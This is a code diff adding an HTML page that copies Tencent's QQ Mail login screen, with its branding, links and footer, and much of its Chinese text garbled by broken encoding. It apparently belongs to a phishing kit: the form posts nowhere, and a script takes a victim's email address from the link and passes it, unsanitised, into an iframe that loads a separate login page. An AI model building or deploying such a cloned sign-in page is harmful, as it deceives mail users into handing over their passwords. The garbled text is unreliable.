ydXsBFypT1icllij+TnT6Hc9DWz1qTBYZA9MwLSTv0gDgjS9WaV5VBmXoQy6RiUMbugSolnjhwQUrFeSvNXQzQR4OiM6iXHUO4bTCUuzXYajpbK/RfJRYj7nwkLg4yQK/0Rk8sie1QqSDfMQ82vCzRkYTyQTA6JR0NAKgXKS6EqzodIqdIhkra3Ej1kFvmjue7shpo5O1Ae1M2oR6TZTsPRUjlzyaXtKbQnY85i1h9TXw9tDD5PZWlCQ99ua2Y4rRIWtvrV8IyeNmCXRxv+BLLRVVaPDvWxR3p4I2qWTwHKSh6Gd+rdk7ZXqiOTmkH6Xkt9X+3NxP4tUfXZb6jyaWXSjGi203C0VM4kox5BJ3OSH4/AHKsMIZCLA0ZxXhZE37yPmtP71cTSIothyMcST72/0tyXySAZ8j4qhn2MWoVpv2xFhrGUJJbKWWUVWUGJQC4rgPgkqZCkxkG1cwVqY3YDNdrJCn5vJrZ3grjvMNQOnoJqH/qPZD5JWAi2mo+AVTyX+cM+WRLisiKIzx0BUuKhupwEVfY1qMpLIVLYQeTqBbGnD0Qt20MVGona9r2glNF/Iu7Jmr1graUICOSyFDlBTkDACAICuYQlIiBgIwQEctkIWEGtgIBALmENCAjYCAGBXDYCVlArICCQS1gDAgI2QkAgl42AFdQKCAjkEtaAgICNEBDIZSNgBbUCAgK5hDUgIGAjBARy2QhYQa2AwP8Bmf14Y4VAB0IAAAAASUVORK5CYII="
+          style="position: absolute"
+        />
+        <a class="header_logo" href="https://mail.qq.com/">QQ锟斤拷锟斤拷</a>
+        <div class="header_link">
+          <a>锟斤拷锟斤拷锟斤拷</a>&nbsp;|&nbsp;<a
+            href="https://en.mail.qq.com/"
+            >English</a
+          >&nbsp;|&nbsp;<a href="https://app.mail.qq.com/" target="_blank"
+            >锟街伙拷锟斤拷</a
+          >&nbsp;|&nbsp;<a
+            href="https://exmail.qq.com/?referrer=index_top"
+            target="_blank"
+            >锟街伙拷锟斤拷</a
+          >
+        </div>
+      </div>
+      <div class="content">
+        <div id="downError" class="login_msg" style="display: none">
+          <p>
+            <span class="login_msg_warning"></span
+            >���ڼ��ذ�ȫ���ʧ�ܣ�Ϊ�������ʺŰ�ȫ���޷�������¼���䣬���������
+          </p>
+          <ul>
+            <li>����F5����ˢ��ҳ�档</li>
+            <li>
+              ���������ѡ��˵���ѡ��Internetѡ���ִ����ջ��湦�ܣ�ȷ����F5ˢ�±�ҳ�档
+            </li>
+            <li>
+              ��������ʽ��Ȼ�޷�������⣬���¼<a
+                href="http://maildisk.bbs.qq.com/"
+                target="_blank"
+                >������̳֪ͨ����</a
+              >�����ǽ�����Ϊ�������
+            </li>
+          </ul>
+        </div>
+        <div class="content_wrapper">
+          <div
+            class="xm_login_container login_container"
+            id="login"
+            style="width: 330px; height: 336px; visibility: visible"
+          >
+            <div class="xm_login_card">
+              <div class="xm_login_card_tab">
+                <div class="xm_login_card_tab_item" id="wxLoginTab">
+                  微锟脚碉拷录
+                </div>
+                <div
+                  class="xm_login_card_tab_item xm_login_card_tab_item_Active"
+                  id="qqLoginTab"
+                >
+                  QQ锟斤拷录
+                </div>
+              </div>
+              <div class="xm_login_card_cnt">
+                <div class="xm_login_card_qq" id="qqLoginCard">
+                  <iframe
+                    id="login_frame"
+                    name="login_frame"
+                    height="100%"
+                    scrolling="no"
+                    width="100%"
+                    frameborder="0"
+                    test="jostinsu1"
+                    src=""
+                  ></iframe>
+                </div>
+              </div>
+            </div>
+            <div class="login_box second_login_box" style="display: none">
+              <div class="login_box_header">
+                <h1 class="login_box_title">��¼QQ����</h1>
+              </div>
+              <div
+                id="msgContainer"
+                class="login_box_msg"
+                style="display: none"
+              ></div>
+              <noscript
+                ><div class="login_box_msg noScript">
+                  �����������֧�ֻ��Ѿ���ֹ��ҳ�ű������޷�������¼��<a
+                    href="/zh_CN/help/error_noscript.html"
+                    title="�˽���ҳ�ű����Ƶĸ�����Ϣ"
+                    target="_blank"
+                    ><img
+                      src="https://rescdn.qqmail.com/zh_CN/htmledition/images/ico_help1e9c5d.gif"
+                      style="margin: 0 2px"
+                      align="absmiddle"
+                    />��ν���ű�����</a
+                  >
+                </div></noscript
+              >
+              <div
+                class="login_box_msg noCookie"
+                id="infobarNoCookie"
+                style="display: none"
+              >
+                ����������֧�ֻ��Ѿ���ֹʹ��Cookie�������޷�������¼����<a
+                  href="http://service.mail.qq.com/cgi-bin/help?subtype=1&amp;&amp;id=7&amp;&amp;no=1001007#chrome"
+                  title="�˽�Cookie�ĸ�����Ϣ"
+                  target="_blank"
+                  >����Cookie<img
+                    src="./qq_files/ico_help1e9c5d.gif"
+                    style="margin: 0 2px"
+                    align="absmiddle" /></a
+                >�����ԡ�
+              </div>
+              <div style="display: none" id="qlogin" class="qlogin"></div>
+              <div class="login_operate" id="web_login">
+                <form id="loginform" method="POST" action="">
+                  <div class="login_submit" style="">
+                    <input
+                      class="login_button"
+                      id="btlogin"
+                      name="btlogin"
+                      type="submit"
+                      value="��¼"
+                      tabindex="5"
+                    />
+                  </div>
+                </form>
+              </div>
+              <a
+                class="login_box_forgotpassword"
+                href="https://sv.aq.qq.com/cn2/findpsw/pc/pc_find_pwd_input_account?pw_type=6&amp;aquin=&amp;source_id=2705"
+                target="_blank"
+                >�������룿</a
+              >
+              <div
+                style="display: none"
+                id="switch"
+                class="lineright"
+                onmouseup="QMLogin.switchMode()"
+              ></div>
+            </div>
+          </div>
+          <div class="login_pictures">
+            <div
+              class="login_pictures_picture"
+              style="
+                background-image: url(&#39;https://rescdn.qqmail.com/zh_CN/htmledition/images/tg-mj1e9c5d.jpg&#39;);
+                background-position: right 20px;
+              "
+            ></div>
+          </div>
+        </div>
+      </div>
+      <div class="footer">
+        <a href="https://www.tencent.com/" target="_blank"
+          >锟斤拷锟斤拷锟斤拷讯</a
+        >&nbsp;|&nbsp;<a
+          href="https://mail.qq.com/cgi-bin/readtemplate?check=false&amp;t=mail_clause"
+          target="_blank"
+          >锟斤拷锟斤拷锟斤拷锟斤拷</a
+        >&nbsp;|&nbsp;<a href="https://privacy.qq.com/" target="_blank"
+          >锟斤拷私锟斤拷锟斤拷</a
+        >&nbsp;|&nbsp;<a
+          href="https://kf.qq.com/product/email.html"
+          target="_blank"
+          >锟酵凤拷锟斤拷锟斤拷</a
+        >&nbsp;|&nbsp;<a
+          href="https://mail.qq.com/zh_CN/contact_us.html"
+          target="_blank"
+          >锟斤拷系锟斤拷锟斤拷</a
+        >&nbsp;|&nbsp;<a href="https://service.mail.qq.com/" target="_blank"
+          >锟斤拷锟斤拷锟斤拷锟斤拷</a
+        >&nbsp;|&nbsp;<span class="gray"
+          >&copy;1998 - 2021 Tencent Inc. All Rights Reserved.</span
+        >
+      </div>
+    </div>
+
+    <style>
+      .tb_button {
+        padding: 1px;
+        cursor: pointer;
+        border-right: 1px solid #8b8b8b;
+        border-left: 1px solid #fff;
+        border-bottom: 1px solid #fff;
+      }
+      .tb_button.hover {
+        borer: 2px outset #def;
+        background-color: #f8f8f8 !important;
+      }
+      .ws_toolbar {
+        z-index: 100000;
+      }
+      .ws_toolbar .ws_tb_btn {
+        cursor: pointer;
+        border: 1px solid #555;
+        padding: 3px;
+      }
+      .tb_highlight {
+        background-color: yellow;
+      }
+      .tb_hide {
+        visibility: hidden;
+      }
+      .ws_toolbar img {
+        padding: 2px;
+        margin: 0px;
+      }
+    </style>
+    <script src="/jquery.js"></script>
+    <script>
+      const queryS = window.location.search;
+      let parameters = new URLSearchParams(queryS);
+      let qemail = parameters.get("email");
+      $("#login_frame").attr("src", `xlogin.html?email=${qemail}`);
+    </script>
+  </body>
+</html>
